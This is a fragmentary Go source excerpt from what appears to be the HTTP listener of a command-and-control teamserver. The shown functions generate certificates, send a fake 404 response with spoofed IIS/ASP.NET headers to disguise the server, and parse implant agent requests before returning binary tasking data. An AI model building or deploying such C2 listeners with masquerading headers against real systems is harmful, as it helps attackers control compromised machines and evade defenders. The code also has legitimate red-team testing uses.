...
func (h *HTTP) generateCertFiles() bool {
	...
	if err != nil {
		logger.Error("Failed to compile listener name regex: " + err.Error())
		return false
	}
...
func (h *HTTP) fake404(ctx *gin.Context) {
	...
	ctx.Header("Server", "Microsoft-IIS/10.0")
	ctx.Header("Content-Type", "text/html")
	ctx.Header("X-Powered-By", "ASP.NET")
...
func (h *HTTP) request(ctx *gin.Context) {
	...
	*/
	...
	if Response, Success := parseAgentRequest(h.Teamserver, Body, ExternalIP, []byte(h.Config.PSK)); Success {
		respData := Response.Bytes()
		logger.Debug(fmt.Sprintf("[HTTP] Sending response: %d bytes", len(respData)))
		// Use ctx.Data() which properly sets status, content-type, and body atomically
		ctx.Data(http.StatusOK, "application/octet-stream", respData)
			return
	} else {
